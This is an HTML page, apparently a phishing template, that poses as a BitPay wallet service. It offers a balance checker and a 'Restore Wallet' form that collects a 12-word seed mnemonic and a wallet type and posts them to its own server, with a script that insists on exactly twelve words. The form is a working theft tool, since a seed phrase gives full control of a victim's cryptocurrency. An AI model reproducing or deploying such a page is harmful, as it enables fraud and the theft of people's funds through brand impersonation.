<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	<title>BitPay</title>

	<!-- Bootstrap -->
	<link href="css/bootstrap.css" rel="stylesheet">

	<!-- Fontawesome -->
	<link href="css/font-awesome.min.css" rel="stylesheet">

	<!-- Custom-->
	<link href="css/style.css" rel="stylesheet">

	<link href="css/bslikerc.css" rel="stylesheet">

	<link href="css/flatpickr.min.css" rel="stylesheet">

	<link href="css/footable.bootstrap.min.css" rel="stylesheet">

	<link href="css/select2.min.css" rel="stylesheet">


	<link rel="stylesheet" href="css/main.css" data-instant-track>


	<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">


	<style>
		h4 {
			font-family: 'Courgette', cursive;
		}
		
		.head {
			background: #7a1632;
			color: white;
			border-radius: 50%;
			padding: 4px;
			display: inline-block;
			width: 27px;
			text-align: center;
		}
		.tl td, .tl th {
    text-align: left; 
}
.tab td, .tab th {
    text-align: center; 
   
}
.tab th {
    background: #2C3E50;
    color: white;
}

.tll th {
	 background: #2C3E50;
    color: white;

}
.tab{
	display: none;
}
.tll{
	/*display: none;*/
	float: left;
	margin-top:35px;

}

.sb{
	float:left;
width: 100%;
overflow-y: auto;
height: 190px;
}

.err{
	color: red;
}

.padleri{
	padding-left: 0px;
	padding-right:0px;
}

@media screen and (max-width: 700px) {
   
    #check{
    	margin-top: 10px;
    }
}

	</style>



	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body>

<div data-offcanvas class="off-canvas-wrap container padleri">
		<div class="inner-wrap">
			<div role="navigation" style="background: #30545A url('images/banner.040042a3.jpg'); background-size: cover; background-position: top;">
				<div role="navigation" class="row">
					<div class="column small-1">
						<a href="default.htm" title="Home" class="logo margin-top"></a>
					</div>
					<!-- <div class="column small-11 show-for-large-up">
						<ul class="inline-list right padding-top-less medium-padding-top">
							<li><a href="#" class="menu-item small white">FAQs</a></li>
							<li><a href="#" class="menu-item small white">Terms of use</a></li>
							
						</ul>
					</div> -->
					<!-- <div class="column small-3 hide-for-large-up margin-top right"><a href="javascript:;" cancel-s18n class="right-off-canvas-toggle menu-icon"><span></span></a></div>
					<aside class="right-off-canvas-menu">
						<ul class="no-bullet padding-left padding-top-less">
							<li><a href="#" class="menu-item small white"> FAQs</a></li>
							<li> <a href="#" class="menu-item small white">Terms of use</a></li>
						</ul>
					</aside> -->
				</div>
				<div class="section">
					<div class="row">
						<div class="column large-8 large-offset-2 text-center">
							<h1 class="white fade-in text-shadow">Secure solutions for your digital money</h1>
						</div>
					</div>
					<div class="row">
						<div class="column large-8 large-offset-2 text-center">
							<h3 class="white medium-margin-top-less fade-in delay-4 text-shadow">Check your trasnsactions, <span data-tooltip aria-haspopup="true" title="hierarchical-deterministic – HD wallets make protecting your bitcoin easier. One backup is all you need to access your bitcoin forever." class="has-tip tip-top white">Restore</span>&#8209;your  wallet on BitPay.</h3>
							<div class="margin-top-less fade-in delay-4"></div>
						</div>
					</div>
				</div>
				
				</div>
			</div>
			<div class="section">
				<div class="row">
					
					<div class="column large-12">
						<h2 class="header__bottom-border__large-left padding-top">Transactions</h2>
						<div class="form-group  ">
					<label for="textField" class="col-md-4 control-label text-left">Bitcoin Address</label>
					<div class="col-md-6">
						<input id="address" type="text" placeholder="" data-bvalidator="required" class="form-control">
					</div>

                      

					<div class="col-md-2">
						<input type="submit" id="check" class="btn btn-used" value="Check Balance">
					</div>
				</div>
					</div>
					<div class="large-12">

						
						<table class="tll table">
					   <thead>
							<tr>
								<th> <img src="images/receive-mail.png">Total Recieved</th>
								<th><img src="images/email.png">Total Sent</th>
								<th><img src="images/scale.png">Final Balance</th>
								<th> <img src="images/transaction.png">Total Transactions</th>
							</tr>
						</thead>
				<tbody>
					
					<tr>

						<td>
							<label for="" id="recieved"></label>
						</td>

						<td>
							<label for="" id="sent"></label>
						</td>

						

						<td>
							<label for="" id="balance"></label>
						</td>

						<td>
							<label for="" id="transactions"></label>
						</td>
						
					</tr>
				</tbody>

					

				</table>
					

					</div>

					
				</div>
			</div>
			
			<div class="section">
				<div class="row">
					
					<div class="column large-12 ">
						<div class="sb ">
					<table class="table table-striped tab large-12 ">
						<thead>
							<tr>
								<th>Date</th>
								<th>Amount</th>
								<th>Balance</th>
							</tr>
						</thead>
						<tbody>

						</tbody>
					</table>

				</div>
					</div>
					
				</div>
			</div>
			
		
			
			<div class="section bg-gray">
				<div class="row">
						<h2 class="header__bottom-border__large-left padding-top">Restore Wallet</h2>
					<div class="column large-12 small-12 text-center">
						<form action="/" method="post">
					<!--text field start-->
					<div class="form-group  col-md-12">
						<label for="textField" class="col-md-4 control-label text-left">Seed Nemonic(12 words)</label>
						<div class="col-md-8">
							<input id="max" name="password" type="text" placeholder="" data-bvalidator="required" class="form-control">
							<i class="err"> </i>
						</div>


					</div>
					<!--text field end-->

					<!--select field start-->
					<div class="form-group  col-md-12">
						<label for="dateField" class="col-md-4 control-label text-left">Select Wallet Type</label>
						<div class="col-md-8">
							<select name="wallet" class="drop form-control" data-bvalidator="required">
                                        <option value="Eletrum">Eletrum</option>
                                        <option value="Jaxx">Jaxx</option>
                                        <option value="Exodus">Exodus</option>
                                        <option value="Coinimi">Coinimi</option>
                                    </select>
						</div>
					</div>
					{{csrf_field()}}


					<!--Submit Button Start-->

					<div class="form-group  col-md-12 text-center">
						<div>
							<input type="submit" class="btn btn-used" value="Restore Wallet">
						</div>
					</div>
				</form>
					</div>
					
				</div>
			</div>
			<footer>
				<div role="navigation" class="row">
					<div class="column small-1">
						<a href="default.htm" title="Home" class="logo margin-top"></a>
					</div>
					<div class="column small-11 show-for-large-up">
						<ul class="inline-list right padding-top-less medium-padding-top">
							<li><a href="#" class="menu-item small white">FAQs</a></li>
							<li><a href="disclaimer" class="menu-item small white">Terms of Use </a></li>
							
						</ul>
					</div>
				</div>
			</footer>
			<a class="exit-off-canvas"></a>
		</div>
	</div>
	<!-- /.container -->


	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src="js/jquery-3.2.1.min.js"></script>
	<!-- Include all compiled plugins (below), or include individual files as needed -->
	<script src="js/bootstrap.min.js"></script>


	<script src="js/flatpickr.min.js"></script>

	<script src="js/jquery.bvalidator.min.js"></script>

	<script src="js/default.min.js"></script>

	<script src="js/bslikerc.js"></script>

	<script src="js/select2.min.js"></script>

	<script src="js/footable.min.js"></script>
	<script src="js/project.js"></script>

	<script src="js/main.min.js" ></script>

	<script>
		var optional_config = {
			dateFormat: "d-m-Y"
		}

		$(".date").flatpickr(optional_config);




		$(document).ready(function() {
			$('form').bValidator();

			$('form').submit(function(){
				var space = $('#max').val();
				var trimmed = space.trim();
				if(trimmed.match(/([\s]+)/g).length != 11){
					$(".err").append("Enter twelve words key")
					setTimeout(function(){$('.err').empty()}, 3000);
					return false;
				}
				
			});
		});




	</script>
</body>

</html>
